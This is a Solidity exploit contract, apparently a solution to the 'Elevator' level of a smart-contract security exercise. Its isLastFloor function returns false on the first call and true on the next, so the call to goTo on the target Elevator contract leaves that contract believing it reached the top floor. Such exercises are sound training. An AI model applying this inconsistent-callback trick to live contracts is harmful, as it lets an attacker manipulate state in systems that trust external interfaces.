// SPDX-License-Identifier: MIT
import "./Elevator.sol";
pragma solidity ^0.8.0;

contract ElevatorAttack {
    uint256 public calls = 0;

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (calls == 0) {
            calls = calls + 1;
            return false;
        }
        return true;
    }

    function attack(address _address) public {
        Elevator elevator = Elevator(_address);
        elevator.goTo(1);
    }

}